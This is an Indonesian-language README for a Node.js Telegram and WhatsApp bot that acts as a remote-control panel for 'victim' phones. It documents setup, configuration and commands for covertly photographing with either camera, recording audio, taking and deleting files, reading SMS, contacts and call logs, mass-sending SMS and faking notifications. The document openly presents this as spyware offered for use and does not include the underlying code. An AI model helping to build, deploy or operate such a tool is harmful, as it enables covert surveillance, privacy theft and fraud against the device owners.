# Dual-Platform Bot (Telegram + WhatsApp)

Dokumentasi penggunaan bot sadap dual-platform yang mendukung Telegram dan WhatsApp secara bersamaan.

## Deskripsi

Bot ini adalah solusi dual-platform yang memungkinkan pengguna untuk mengendalikan perangkat target melalui Telegram dan WhatsApp. Bot ini memiliki berbagai fitur untuk memantau dan mengendalikan perangkat target, termasuk akses ke kamera, mikrofon, file, SMS, dan banyak lagi.

## Fitur Utama

- Mendukung dua platform: Telegram dan WhatsApp
- Memantau informasi perangkat (model, baterai, versi, provider)
- Mengakses kamera depan dan belakang
- Merekam suara
- Mengakses dan menghapus file
- Mengirim SMS dan melihat riwayat SMS
- Melihat kontak dan riwayat panggilan
- Menampilkan notifikasi dan pesan di layar
- Mengirim getaran ke perangkat
- Memutar audio
- Dan banyak lagi

## Instalasi

1. Pastikan Node.js dan npm sudah terinstal di sistem Anda
2. Clone repositori ini
3. Instal dependensi dengan menjalankan:
   ```
   npm install
   ```
4. Edit file `config.js` dan sesuaikan dengan kebutuhan Anda:
   ```javascript
   const config = {
     // Telegram configuration
     token: 'YOUR_TELEGRAM_BOT_TOKEN',
     id: 'YOUR_TELEGRAM_USER_ID',
     
     // WhatsApp configuration
     nomerwa: 'YOUR_WHATSAPP_NUMBER', // with country code, e.g. '6281234567890'
     
     // Shared configuration
     surya: 'ADDITIONAL_ADMIN_ID',
     address: 'https://www.google.com',
     
     // Bot settings
     prefix: '.',
     botName: 'DualBot',
     ownerName: 'YourName',
     
     // Server settings
     port: process.env.PORT || 8999
   };
   ```
5. Jalankan bot dengan perintah:
   ```
   node index.js
   ```
6. Untuk WhatsApp, scan QR code yang muncul di terminal dengan aplikasi WhatsApp di ponsel Anda

## Penggunaan

### Telegram

1. Mulai bot dengan mengirim perintah `/start`
2. Gunakan tombol "📖 DAFTAR KORBAN" untuk melihat perangkat yang terhubung
3. Gunakan tombol "☠️ SADAP KORBAN" untuk memilih perangkat dan mengakses fitur-fitur sadap
4. Ikuti instruksi yang muncul untuk menggunakan fitur-fitur tertentu

### WhatsApp

1. Kirim pesan `.menubot` untuk melihat daftar perintah yang tersedia
2. Gunakan perintah `.daftarkorban` untuk melihat perangkat yang terhubung
3. Gunakan perintah `.sadapkorban` untuk memilih perangkat dan mengakses fitur-fitur sadap
4. Ikuti instruksi yang muncul untuk menggunakan fitur-fitur tertentu

## Perintah WhatsApp

- `.menubot` - Menampilkan menu utama
- `.help` - Menampilkan bantuan penggunaan
- `.daftarkorban` - Melihat daftar perangkat korban
- `.sadapkorban` - Memilih perangkat untuk disadap
- `.info` - Informasi tentang bot
- `.ping` - Cek status bot

## Fitur Sadap

Berikut adalah fitur-fitur sadap yang tersedia:

1. **Info HP** - Mendapatkan informasi detail tentang perangkat
2. **Aplikasi** - Melihat daftar aplikasi yang terinstal
3. **Kontak** - Melihat daftar kontak
4. **Riwayat Telp** - Melihat riwayat panggilan
5. **SMS** - Melihat pesan SMS
6. **Kirim SMS** - Mengirim SMS dari perangkat target
7. **Kirim SMS ke semua kontak** - Mengirim SMS ke semua kontak
8. **Ambil File** - Mengakses file dari perangkat
9. **Hapus File** - Menghapus file dari perangkat
10. **Kamera Depan** - Mengambil foto dari kamera depan
11. **Kamera Belakang** - Mengambil foto dari kamera belakang
12. **Rekam Suara** - Merekam suara dari mikrofon
13. **Teks Layar** - Menampilkan pesan di layar
14. **Buat Notifikasi** - Membuat notifikasi palsu
15. **Kirim Getaran** - Mengirim getaran ke perangkat

## Catatan Penting

- Pastikan aplikasi target sudah terinstal di perangkat korban
- Bot ini hanya akan merespon perintah dari admin yang terdaftar di file konfigurasi
- Untuk fitur WhatsApp, pastikan nomor WhatsApp admin sudah dikonfigurasi dengan benar
- Beberapa fitur mungkin memerlukan izin tambahan di perangkat target

## Struktur Proyek

- `index.js` - File utama server
- `config.js` - File konfigurasi
- `telegramBot.js` - Implementasi bot Telegram
- `whatsappBot.js` - Implementasi bot WhatsApp
- `utils.js` - Fungsi utilitas bersama

## Troubleshooting

- Jika bot WhatsApp tidak terhubung, pastikan QR code sudah di-scan dengan benar
- Jika perangkat target tidak muncul, pastikan aplikasi target sudah berjalan dengan benar
- Jika ada fitur yang tidak berfungsi, periksa izin aplikasi di perangkat target

## Pengembangan

Bot ini dikembangkan menggunakan:
- Node.js
- Express
- WebSocket
- node-telegram-bot-api
- whatsapp-web.js

## Kontak

Jika Anda mengalami masalah atau memiliki pertanyaan, silakan hubungi @SisuryaOfficial.
